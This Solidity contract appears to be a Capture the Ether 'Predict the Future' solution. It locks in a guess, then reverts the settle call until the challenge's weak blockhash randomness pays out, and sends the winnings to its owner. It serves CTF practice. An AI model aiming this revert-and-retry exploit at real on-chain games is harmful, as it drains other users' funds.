/**
 *Submitted for verification at Etherscan.io on 2022-04-29
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 number) external payable;
    function settle() external;
    function isComplete() external view returns(bool);
}

contract PredictTheFutureSolver {
    IPredictTheFutureChallenge public challenge;
    address payable private owner;
    
    event Received(address, uint);
    event challengeSolved(uint256 balance);

    constructor() {
        owner = payable(msg.sender);
    }

    function solver(address challengeAddress) public {
        require(msg.sender == owner, "Only the owner can set challenge address");
        challenge = IPredictTheFutureChallenge(challengeAddress);
    }


    function predict(uint8 n) public payable {
        require(msg.sender == owner, "Only the owner can predict the number");
        require(msg.value == 1 ether, "You must send 1 ether to predict the number");
        require(n >= 0 && n <= 9, "Number must be in the 0-9 range");
        
        challenge.lockInGuess{value: msg.value}(n);
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        
        challenge.settle();

        require(challenge.isComplete(), "Guess failed, please try again"); // if not complete, revert the transaction, any change of the challenge contract will rollback
        payable(msg.sender).transfer(address(this).balance);
        emit challengeSolved(address(this).balance);
    }

    function destroy() public {
        require(msg.sender == owner, "Only the owner can destroy this contract");
		selfdestruct(payable(msg.sender)); 
	}

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

}